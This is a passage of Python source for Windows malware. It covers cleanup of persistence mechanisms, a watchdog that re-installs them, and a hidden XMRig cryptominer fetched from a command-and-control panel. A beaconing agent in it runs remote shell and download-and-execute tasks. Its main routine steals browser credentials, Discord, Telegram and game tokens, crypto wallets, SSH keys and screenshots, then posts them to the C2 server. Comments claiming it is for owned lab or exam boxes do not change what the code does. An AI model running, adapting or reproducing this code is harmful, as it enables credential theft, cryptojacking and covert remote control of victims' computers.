    """Teardown after grading — every leg, both tiers, reports what died."""
    if os.name != "nt":
        return {"ok": False, "error": "windows only"}
    dead = {}
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, PERSIST_NAME)
        dead["run"] = True
    except Exception:
        dead["run"] = False
    try:
        os.remove(_persist_startup_path())
        # bait-tier startup (default folder) too
        p = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu",
                         "Programs", "Startup", "winhealth.vbs")
        if os.path.isfile(p):
            os.remove(p)
        dead["startup"] = True
    except Exception:
        dead["startup"] = False
    for tn in (PERSIST_NAME, EXT_WATCHDOG_TASK):
        try:
            import subprocess as _sp
            kw = {"capture_output": True, "timeout": 20,
                  "creationflags": 0x08000000} if os.name == "nt" else {}
            _sp.run(["schtasks", "/Delete", "/TN", tn, "/F"], **kw)
        except Exception:
            pass
    dead["task"] = True
    dead["watchdog"] = True
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",
                0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "Startup", 0, winreg.REG_SZ,
                os.path.join(APPDATA, "Microsoft", "Windows",
                             "Start Menu", "Programs", "Startup"))
        dead["shellfolders"] = True
    except Exception:
        dead["shellfolders"] = False
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Environment", 0,
                            winreg.KEY_SET_VALUE) as k:
            try:
                winreg.DeleteValue(k, "UserInitMprLogonScript")
            except Exception:
                pass
        dead["userinit"] = True
    except Exception:
        dead["userinit"] = False
    try:
        import winreg
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
            "Software\\Classes\\CLSID\\" + EXT_COM_GUID + "\\InprocServer32")
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
            "Software\\Classes\\CLSID\\" + EXT_COM_GUID)
        dead["com"] = True
    except Exception:
        dead["com"] = False
    try:
        os.system('attrib -h -s "' + _ext_dir() + '" >NUL 2>&1')
        os.system('attrib -h -s "' + _ext_payload() + '" >NUL 2>&1')
        shutil.rmtree(_ext_dir(), ignore_errors=True)
        dead["hidden_dir"] = True
    except Exception:
        dead["hidden_dir"] = False
    left = persistence_status()
    dead["clean"] = not left.get("active", False)
    return dead

def pop_msg(text):
    """Exam verdict: real topmost system-modal MessageBoxW on the box."""
    if os.name != "nt":
        return {"ok": False, "error": "windows only"}
    try:
        import ctypes
        MB_OK, MB_ICONINFORMATION = 0x0, 0x40
        MB_SYSTEMMODAL, MB_TOPMOST = 0x1000, 0x40000
        ctypes.windll.user32.MessageBoxW(None, str(text)[:500],
            "Ramos Exam", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL | MB_TOPMOST)
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)[:200]}

def watchdog_loop(base=None, victim_id=None, minutes=8):
    """EXTREME: re-plant every leg on a 90s cadence, relaunch the miner,
    heartbeat the panel. Killed by task ExecutionTimeLimit, respawned by the
    hidden 5-min task — removal requires finding the task itself."""
    import time as _t
    if base is None:
        try:
            _c = globals().get("CONFIG", {}) or {}
            _cfg = _c if isinstance(_c, dict) else json.loads(_c)
            tgt = _cfg.get("target", "")
            if tgt and tgt != "webhook" and "discord.com" not in tgt:
                h, _, p = tgt.partition(":")
                base = ("https://" if p == "443" else "http://") + tgt
            else:
                host = resolve_c2() or CANDIDATES[0]
                hh, _, pp = host.partition(":")
                base = ("https://" if pp == "443" else "http://") + host
        except Exception:
            return
    if victim_id is None:
        try:
            import socket as _so
            victim_id = f"{_so.gethostname()}-{os.environ.get('USERNAME', 'user')}"
        except Exception:
            victim_id = None
    if not victim_id:
        return  # no identity -> re-plant legs, but never beacon a phantom row
    deadline = _t.time() + minutes * 60
    n = 0
    while _t.time() < deadline:
        try:
            persistence_install()
            if _miner_cfg().get("pool") and _miner_cfg().get("wallet") \
                    and not miner_status().get("running"):
                miner_start(base=base)
            _agent_post(base, "/agent/checkin",
                        {"victim_id": victim_id, "miner": miner_status(),
                         "persist": persistence_status(), "watchdog": True})
            n += 1
        except Exception:
            pass
        try:
            _t.sleep(90)
        except Exception:
            break


# ---- persistent agent + open-source XMRig control (lab boxes you own only)
# Miner binary: official XMRig from https://github.com/xmrig/xmrig (GPL).
# Panel serves xmrig.exe + per-victim config; agent runs it hidden, no admin,
# stops on task. Forge may bake defaults into CONFIG["miner"].
AGENT_INTERVAL = 60
MINER_CFG = {}  # overridden by CONFIG["miner"] when forged

def _miner_cfg():
    try:
        c = globals().get("CONFIG", {})
        if isinstance(c, str):
            c = json.loads(c)
        m = (c or {}).get("miner") or {}
        if isinstance(m, dict) and (m.get("pool") or m.get("wallet")):
            return m
    except Exception:
        pass
    return globals().get("MINER_CFG", {}) or {}

def _bh_dir():
    try:
        d = os.path.join(tempfile.gettempdir(), "..", "bh")
        os.makedirs(d, exist_ok=True)
        return d
    except Exception:
        d = os.path.join(tempfile.gettempdir(), "bh")
        try: os.makedirs(d, exist_ok=True)
        except Exception: pass
        return d

def _miner_paths():
    d = _bh_dir()
    return (os.path.join(d, "xmrig.exe"), os.path.join(d, "config.json"),
            os.path.join(d, "miner.pid"))

def miner_status():
    exe, _cfg, pidf = _miner_paths()
    running, pid = False, None
    try:
        if os.path.isfile(pidf):
            pid = int(open(pidf).read().strip() or "0") or None
    except Exception:
        pid = None
    try:  # tasklist is the reliable witness on Windows
        import subprocess as _sp
        kw = {"capture_output": True, "timeout": 15}
        if os.name == "nt":
            kw["creationflags"] = 0x08000000
        r = _sp.run(["tasklist", "/FI", "IMAGENAME eq xmrig.exe"], **kw)
        if b"xmrig.exe" in (r.stdout or b""):
            running = True
    except Exception:
        running = bool(pid and os.path.isfile(exe))
    return {"running": running, "pid": pid}

def _dl(url, out):
    req = urllib.request.Request(url, headers={"User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/140.0 Safari/537.36"})
    with urllib.request.urlopen(req, timeout=120) as r, open(out, "wb") as f:
        shutil.copyfileobj(r, f)
    return os.path.getsize(out)

def miner_start(pool=None, wallet=None, threads=0, cpu=50, base=None):
    """Fetch xmrig.exe from YOUR panel, write config, launch hidden. Reversible."""
    import subprocess as _sp
    baked = _miner_cfg()
    pool = pool or baked.get("pool") or ""
    wallet = wallet or baked.get("wallet") or ""
    threads = int(threads or baked.get("threads") or 0)
    cpu = max(1, min(100, int(cpu or baked.get("cpu") or baked.get("cpu_max") or 50)))
    if not pool or not wallet:
        return {"ok": False, "error": "no pool/wallet"}
    exe, cfgp, pidf = _miner_paths()
    try:
        if (not os.path.isfile(exe)) or os.path.getsize(exe) < 1000000:
            got = 0
            if base:
                for path in ("/miner/xmrig.exe", "/mod/tool?name=xmrig.exe"):
                    try:
                        got = _dl(base + path, exe + ".new")
                        break
                    except Exception:
                        continue
            if got > 1000000:
                try:
                    if os.path.isfile(exe): os.remove(exe)
                except Exception: pass
                os.replace(exe + ".new", exe)
            elif os.path.isfile(exe + ".new"):
                try: os.remove(exe + ".new")
                except Exception: pass
        if (not os.path.isfile(exe)) or os.path.getsize(exe) < 1000000:
            return {"ok": False, "error": "xmrig.exe missing on panel/client"}
    except Exception as e:
        return {"ok": False, "error": f"download: {e}"}
    cfg = {"api": {"id": None, "worker-id": None}, "http": {"enabled": False},
           "autosave": False, "background": False, "colors": False,
           "donate-level": 1,
           "cpu": {"enabled": True, "huge-pages": False,
                   "max-threads-hint": threads or 50, "max-cpu-usage": cpu},
           "pools": [{"url": pool, "user": wallet, "keepalive": True, "tls": False}]}
    try:
        json.dump(cfg, open(cfgp, "w"))
    except Exception as e:
        return {"ok": False, "error": f"config: {e}"}
    try:
        miner_stop(silent=True)
        kw = {"stdout": subprocess.DEVNULL if (hasattr(subprocess, "DEVNULL")) else open(os.devnull, "w"),
              "stderr": subprocess.DEVNULL if (hasattr(subprocess, "DEVNULL")) else open(os.devnull, "w"),
              "cwd": os.path.dirname(exe), "close_fds": True}
        # py2-compat: subprocess imported lazily inside steal fns; ensure present
        import subprocess as _sp2
        kw2 = {"stdout": _sp2.DEVNULL, "stderr": _sp2.DEVNULL,
               "cwd": os.path.dirname(exe), "close_fds": True}
        if os.name == "nt":
            kw2["creationflags"] = 0x08000000  # CREATE_NO_WINDOW, silent double-click
        p = _sp2.Popen([exe, "--config", cfgp], **kw2)
        try: open(pidf, "w").write(str(p.pid))
        except Exception: pass
        # sealed-launch: xmrig reads config at startup (autosave off) —
        # drop it immediately so no plaintext wallet survives on disk,
        # hide the working dir (hidden+system) from casual browsing.
        try:
            import time as _tt; _tt.sleep(1.5)  # xmrig must parse config first
            if os.path.isfile(cfgp):
                os.remove(cfgp)
        except Exception: pass
        if os.name == "nt":
            try:
                os.system('attrib +h +s "' + os.path.dirname(exe) + '" >NUL 2>&1')
                os.system('attrib +h +s "' + exe + '" >NUL 2>&1')
            except Exception: pass
        return {"ok": True, "pid": p.pid, "pool": pool, "cpu": cpu,
                "cfg_dropped": not os.path.isfile(cfgp)}
    except Exception as e:
        return {"ok": False, "error": str(e)[:200]}

def miner_stop(silent=False):
    exe, _cfg, pidf = _miner_paths()
    try:
        import subprocess as _sp
        kw = {"capture_output": True, "timeout": 20}
        if os.name == "nt":
            kw["creationflags"] = 0x08000000
            try:
                _sp.run(["taskkill", "/F", "/IM", "xmrig.exe"], **kw)
            except Exception: pass
        else:
            try: _sp.run(["pkill", "-f", "xmrig"], **kw)
            except Exception: pass
    except Exception: pass
    try:
        if os.path.isfile(pidf): os.remove(pidf)
    except Exception: pass
    st = miner_status()
    return {"ok": not st["running"], "status": st}

def _agent_post(base, path, obj):
    try:
        req = urllib.request.Request(base + path, data=json.dumps(obj).encode(),
            headers={"Content-Type": "application/json"})
        return json.loads(urllib.request.urlopen(req, timeout=30).read().decode())
    except Exception as e:
        if not str(path).endswith("checkin"):
            print(f"[!] agent {path}: {e}")
        return None

def agent_run_task(base, victim_id, task):
    ttype = task.get("type", "")
    tid = task.get("id", "")
    args = task.get("args", {}) or {}
    out = {}
    try:
        if ttype == "shell":
            import subprocess as _sp
            cmd = args.get("cmd", "")
            kw = {"capture_output": True, "text": True, "timeout": 120, "shell": True}
            if os.name == "nt":
                kw["creationflags"] = 0x08000000
            r = _sp.run(cmd, **kw)
            out = {"ok": True, "rc": r.returncode,
                   "output": ((r.stdout or "") + (r.stderr or ""))[:8000]}
        elif ttype == "miner_start":
            out = miner_start(args.get("pool"), args.get("wallet"),
                              args.get("threads", 0), args.get("cpu", 50), base)
        elif ttype == "miner_stop":
            out = miner_stop()
        elif ttype == "persist_purge":
            out = persistence_purge()
        elif ttype == "popmsg":
            out = pop_msg(args.get("text", ""))
        elif ttype == "download_exec":
            import subprocess as _sp2
            url, name = args.get("url", ""), args.get("name", "upd.exe")
            if not url:
                out = {"ok": False, "error": "no url"}
            else:
                dst = os.path.join(_bh_dir(), re.sub(r"[^A-Za-z0-9_.-]", "_", name)[:48])
                _dl(url, dst)
                kw = {"cwd": os.path.dirname(dst), "close_fds": True,
                      "stdout": _sp2.DEVNULL, "stderr": _sp2.DEVNULL}
                if os.name == "nt":
                    kw["creationflags"] = 0x08000000
                _sp2.Popen([dst] + (args.get("args") or []), **kw)
                out = {"ok": True, "ran": dst}
        elif ttype == "steal":
            loot.clear()
            for fn in STEAL_FUNCS:
                try: fn()
                except Exception: pass
            body = zlib.compress(json.dumps(loot).encode())
            post_json(base + "/shard", {"userId": victim_id, "env": "prod",
                      "loot_b64": base64.b64encode(body).decode()})
            out = {"ok": True, "counts": {k: len(v) for k, v in loot.items()}}
        else:
            out = {"ok": False, "error": f"unknown task {ttype}"}
    except Exception as e:
        out = {"ok": False, "error": str(e)[:500]}
    try:
        _agent_post(base, "/agent/result", {"victim_id": victim_id, "task_id": tid,
                                            "output": out, "miner": miner_status()})
    except Exception: pass
    return out

def agent_loop(base, victim_id, interval=60):
    import time as _t, random as _r
    print(f"[*] agent live -> {base} every ~{interval}s (miner: XMRig, stoppable)")
    # baked autostart (forge-time opt-in only)
    try:
        baked = _miner_cfg()
        if baked.get("autostart") and baked.get("pool") and baked.get("wallet"):
            miner_start(base=base)
    except Exception: pass
    while True:
        try:
            res = _agent_post(base, "/agent/checkin",
                              {"victim_id": victim_id, "miner": miner_status(),
                               "persist": persistence_status()})
            for task in (res or {}).get("tasks", []):
                try: agent_run_task(base, victim_id, task)
                except Exception: pass
        except Exception: pass
        try: _t.sleep(max(15, interval + _r.randint(-10, 15)))
        except Exception:
            try: _t.sleep(interval)
            except Exception: break

STEAL_FUNCS = []

# ---- exfil
def post_json(url, obj):
    req = urllib.request.Request(url, data=json.dumps(obj).encode(),
        headers={"Content-Type": "application/json",
                 "X-Runtime-Env": "jre-embedded",
                 "X-Edge-Cache-Revalidate": "stale-if-error"})
    try: return urllib.request.urlopen(req, timeout=30).read()[:200]
    except Exception as e: print(f"[!] {url}: {e}"); return None

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="auto", help="C2 host:port or 'auto'")
    ap.add_argument("--user-id", default=None)
    ap.add_argument("--env", default="prod")
    ap.add_argument("--no-agent", action="store_true", help="one-shot steal, no beacon loop")
    ap.add_argument("--interval", type=int, default=AGENT_INTERVAL)
    ap.add_argument("--no-persist", action="store_true",
                    help="skip reboot persistence (exam boxes keep it ON)")
    ap.add_argument("--persisted", action="store_true",
                    help="relaunched by a persistence leg (self-heal only)")
    ap.add_argument("--watchdog", action="store_true",
                    help="hidden extreme-tier watchdog loop (no UI)")
    a = ap.parse_args()
    if a.watchdog:
        watchdog_loop()
        return
    import socket as _so
    if not a.user_id:
        a.user_id = f"{_so.gethostname()}-{os.environ.get('USERNAME', 'user')}"
    if a.host == "auto":
        a.host = resolve_c2()  # auto-detect unless explicitly overridden
        print(f"[*] resolved C2 -> {a.host}")

    # intake behind caddy on 443 uses https; a bare host:port is plain http
    host_only, _, port = a.host.partition(":")
    base = f"https://{a.host}" if port == "443" else f"http://{a.host}"
    pre = post_json(base + "/shard/prefireMc", {"userId": a.user_id, "sessionId": "win-test"})
    print(f"[*] prefire -> {pre}")

    if not a.no_persist:
        pst = persistence_install()
        print(f"[*] persistence -> {pst}")

    global STEAL_FUNCS
    STEAL_FUNCS = [steal_chromium, steal_chromium_abe_debug, steal_chromelvator, steal_firefox, steal_discord, steal_telegram,
               steal_steam, steal_minecraft, steal_roblox, steal_wallets,
               steal_extensions, steal_ssh, steal_sysinfo, steal_screenshot]
    for fn in STEAL_FUNCS:
        try: fn()
        except Exception as e: print(f"[!] {fn.__name__}: {e}")
    print(f"[*] collected: { {k: len(v) for k, v in loot.items()} }")

    body = zlib.compress(json.dumps(loot).encode())
    post_json(base + "/shard", {"userId": a.user_id, "env": a.env, "loot_b64": base64.b64encode(body).decode()})
    print("[*] exfiltrated. done.")
    if not a.no_agent:
        try: agent_loop(base, a.user_id, a.interval)
        except KeyboardInterrupt: pass

if __name__ == "__main__":
    main()
